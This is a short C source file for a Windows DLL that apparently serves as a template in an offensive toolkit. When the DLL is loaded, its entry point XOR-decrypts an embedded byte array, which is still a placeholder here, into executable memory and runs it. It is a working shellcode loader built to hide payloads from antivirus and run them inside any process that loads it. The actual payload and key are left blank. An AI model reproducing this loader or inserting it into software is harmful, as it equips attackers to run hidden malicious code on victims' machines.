#include <windows.h>

#pragma comment(lib, "user32.lib")

unsigned char code[] = "<CODE_TO_REPLACE>";
int code_size = sizeof(code);
char key[] = "<KEY_TO_REPLACE>";
int key_size = sizeof(key);

int dll_injec()
{
	int i;
	for (i = 0; i < code_size-1; i++)
		code[i] = code[i] ^ key[i%(key_size-1)];
	code[i] = '\0';

	void *exec = VirtualAlloc(0, code_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, code_size);
	((void(*)())exec)();

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
	switch (nReason){
		case DLL_PROCESS_ATTACH:
			dll_injec();
        		break;
		case DLL_PROCESS_DETACH:
        		break;
    		case DLL_THREAD_ATTACH:
       			break;
    		case DLL_THREAD_DETACH:
        		break;
    	}

    	return TRUE;
}
